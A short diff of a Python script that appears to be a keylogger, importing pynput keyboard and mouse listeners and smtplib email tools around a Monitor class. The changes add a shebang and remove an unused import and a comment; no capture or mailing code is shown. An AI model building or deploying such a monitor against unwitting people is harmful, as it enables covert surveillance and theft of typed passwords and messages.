@@ -1,7 +1,8 @@
+#!/usr/bin/env python3
+
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from tkinter import W                                                               
 from pynput import keyboard, mouse
 import smtplib
 
@@ -47,10 +48,6 @@ class Monitor:
         self.keys.start()
         while True:
             pass
-
-"""
-    MAIN
-"""
 
 def main():
     monitor = Monitor()
